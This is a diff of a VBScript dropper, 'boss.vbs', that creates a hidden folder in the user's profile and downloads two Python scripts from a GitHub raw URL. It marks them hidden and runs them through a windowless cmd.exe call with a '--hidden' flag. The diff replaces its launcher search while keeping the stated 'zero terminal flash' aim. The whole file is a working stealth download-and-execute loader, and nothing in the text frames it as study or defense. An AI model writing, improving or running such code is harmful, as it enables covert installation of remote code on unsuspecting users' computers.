@@ -1,14 +1,15 @@
 Option Explicit
 
 ' ============================================================
-' boss.vbs - Exact port of pp.ps1 with ABSOLUTE ZERO FLASH
+' boss.vbs - downloads auto.py + client.py, runs:
+'   py auto.py client.py --hidden
+' Zero terminal flash. Uses py.exe only (bare, via PATH).
 ' ============================================================
 
 Dim sh, fso, userProfile, configPath, clientPath, autoPath
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Resolve paths
 userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
 If userProfile = "%USERPROFILE%" Or userProfile = "" Then WScript.Quit 1
 
@@ -16,102 +17,84 @@ configPath = fso.BuildPath(userProfile, ".configs")
 clientPath = fso.BuildPath(configPath, "client.py")
 autoPath   = fso.BuildPath(configPath, "auto.py")
 
-' ---- 1. Create config directory silently ----
+' ---- 1. Create .configs silently ----
 On Error Resume Next
-If Not fso.FolderExists(configPath) Then
-    fso.CreateFolder configPath
-End If
+If Not fso.FolderExists(configPath) Then fso.CreateFolder configPath
 If Err.Number <> 0 Then WScript.Quit 1
 Err.Clear
 
-' ---- 2. Hide the directory ----
+' ---- 2. Hide the folder ----
 Dim folder
 Set folder = fso.GetFolder(configPath)
 If Err.Number = 0 Then
-    folder.Attributes = folder.Attributes Or 2 ' 2 = Hidden
+    folder.Attributes = folder.Attributes Or 2
     Err.Clear
 End If
 
-' ---- 3. Download both files ----
+' ---- 3. Download both .py files ----
 If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py", clientPath) Then WScript.Quit 1
-If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py", autoPath) Then WScript.Quit 1
+If Not DownloadFile("https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py",   autoPath)   Then WScript.Quit 1
 
-' ---- 4. Locate Python (Force pythonw.exe or pyw.exe) ----
-Dim launcher, cmd
-launcher = FindLauncher()
-
-If launcher = "" Then
-    MsgBox "Python is not installed or could not be found.", 16, "Error"
+' ---- 4. Confirm py.exe is on PATH ----
+If Not PyOnPath() Then
+    MsgBox "py.exe (Python launcher) not found on PATH. Install Python from python.org with 'py launcher' ticked.", 16, "Error"
     WScript.Quit 1
 End If
 
-' Build the command string
-If InStr(LCase(launcher), "pythonw.exe") > 0 Then
-    ' pythonw.exe does NOT accept the -3 argument
-    cmd = """" & launcher & """ -u """ & autoPath & """ """ & clientPath & """ --hidden"
-Else
-    ' pyw.exe accepts the -3 argument
-    cmd = """" & launcher & """ -3 -u """ & autoPath & """ """ & clientPath & """ --hidden"
-End If
+' ---- 5. Launch: hidden cmd /c cd /d <configPath> && py auto.py client.py --hidden ----
+Dim cmd
+cmd = "cmd.exe /c cd /d """ & configPath & """ && py auto.py client.py --hidden"
 
-' ---- 5. Launch with WScript.Shell (User Context, No Flash) ----
-sh.CurrentDirectory = configPath
+On Error Resume Next
 sh.Run cmd, 0, False
+If Err.Number <> 0 Then
+    Err.Clear
+    On Error GoTo 0
+    WScript.Quit 1
+End If
+On Error GoTo 0
+
 WScript.Quit 0
 
 ' ============================================================
-' Function: FindLauncher (Searches for GUI versions of Python)
+' Function: PyOnPath  (validates bare "py" resolves)
 ' ============================================================
-Function FindLauncher()
-    Dim env, dirs, i, testPath, versions, v
-    FindLauncher = ""
-    
-    ' 1. Search PATH for pythonw.exe and pyw.exe
+Function PyOnPath()
+    Dim env, dirs, i, testPath
+    PyOnPath = False
+
     env = sh.ExpandEnvironmentStrings("%PATH%")
     dirs = Split(env, ";")
     For i = 0 To UBound(dirs)
         If Len(Trim(dirs(i))) > 0 Then
-            testPath = fso.BuildPath(Trim(dirs(i)), "pythonw.exe")
-            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
-            testPath = fso.BuildPath(Trim(dirs(i)), "pyw.exe")
-            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
-        End If
-    Next
-
-    ' 2. Search WindowsApps (Microsoft Store Python)
-    testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\WindowsApps\pythonw.exe")
-    If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
-    testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\WindowsApps\pyw.exe")
-    If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
-
-    ' 3. Search standard AppData installs (Python 3.8 - 3.13)
-    versions = Array("313", "312", "311", "310", "39", "38")
-    For Each v In versions
-        testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Programs\Python\Python" & v & "\pythonw.exe")
-        If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
-    Next
-
-    ' 4. Last resort: standard py.exe (this WILL flash briefly)
-    For i = 0 To UBound(dirs)
-        If Len(Trim(dirs(i))) > 0 Then
             testPath = fso.BuildPath(Trim(dirs(i)), "py.exe")
-            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
+            If fso.FileExists(testPath) Then
+                PyOnPath = True
+                Exit Function
+            End If
         End If
     Next
+
+    ' System-wide py.exe fallback
+    testPath = sh.ExpandEnvironmentStrings("%SystemRoot%\py.exe")
+    If fso.FileExists(testPath) Then
+        PyOnPath = True
+        Exit Function
+    End If
 End Function
 
 ' ============================================================
-' Function: DownloadFile
+' Function: DownloadFile  (unchanged)
 ' ============================================================
 Function DownloadFile(url, target)
     DownloadFile = False
     Dim http, stream, tempFile, f
     tempFile = target & ".download"
-    
+
     On Error Resume Next
     If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
     Err.Clear
-    
+
     If fso.FileExists(target) Then
         fso.GetFile(target).Attributes = 0
         Err.Clear
@@ -123,10 +106,10 @@ Function DownloadFile(url, target)
         Set http = CreateObject("MSXML2.XMLHTTP")
     End If
     If Err.Number <> 0 Then Exit Function
-    
+
     http.Open "GET", url, False
     http.Send
-    
+
     If Err.Number <> 0 Or http.Status <> 200 Then
         Err.Clear
         If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
@@ -138,7 +121,7 @@ Function DownloadFile(url, target)
     stream.Open
     stream.Write http.ResponseBody
     stream.SaveToFile tempFile, 2
-    
+
     If Err.Number <> 0 Then
         Err.Clear
         If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
@@ -156,8 +139,8 @@ Function DownloadFile(url, target)
     If Err.Number <> 0 Then Exit Function
 
     Set f = fso.GetFile(target)
-    f.Attributes = f.Attributes Or 2 
-    
+    f.Attributes = f.Attributes Or 2
+
     DownloadFile = True
     On Error GoTo 0
 End Function
